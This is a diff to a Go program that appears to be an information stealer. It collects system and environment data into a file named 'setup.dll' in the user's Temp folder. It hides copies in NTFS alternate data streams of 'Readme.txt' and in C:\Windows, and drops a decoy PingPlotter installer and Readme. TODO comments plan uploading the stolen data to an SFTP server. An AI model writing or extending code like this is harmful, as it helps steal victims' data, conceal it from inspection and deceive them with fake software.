@@ -2,7 +2,6 @@ package main
 
 /*
 	TODO
-- Distraction (open Browser in full screen mode)
 - Upload DLLs to SFTP Server
 - Download file from SFTP server and hide in exe on Desktop
 -
@@ -30,7 +29,8 @@ func main() {
 }
 
 func saveAllInfo() {
-	f, err := os.Create("setup.dll")
+	usrDir := getUserHomeDir()
+	f, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\setup.dll")
 
 	system := sysGrab()
 	environment := envGrab()
@@ -56,7 +56,8 @@ func fileManger() {
 }
 
 func copyFiles() {
-	input, err := ioutil.ReadFile("setup.dll")
+	usrDir := getUserHomeDir()
+	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\setup.dll")
 	ioutil.WriteFile("Readme.txt:crapS3751243.dll", input, 0644)
 	ioutil.WriteFile("Readme.txt:crapS3636862.dll", input, 0644)
 	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
@@ -64,7 +65,6 @@ func copyFiles() {
 	if err != nil {
 		fmt.Println(err)
 	}
-	os.Remove("setup.dll")
 }
 
 func exportFiles() {
@@ -74,13 +74,21 @@ func downloadFiles() {
 }
 
 func setupFakeEnv() {
+	// Extract Fake Installer
 	usrDir := getUserHomeDir()
 	fakeInstall, err := PingPlotterFakeResource()
 	if err != nil {
 	}
-	out, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\PingPlotterInstaller.exe")
-	out.Write(fakeInstall)
-	out.Close()
+	installer, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\PingPlotterInstaller.exe")
+	installer.Write(fakeInstall)
+	installer.Close()
+	// Create ReadMe File
+	readMeFile, err := ReadmeResource()
+	if err != nil {
+	}
+	readme, err := os.Create("Readme.txt")
+	readme.Write(readMeFile)
+	readme.Close()
 }
 
 func distraction() {
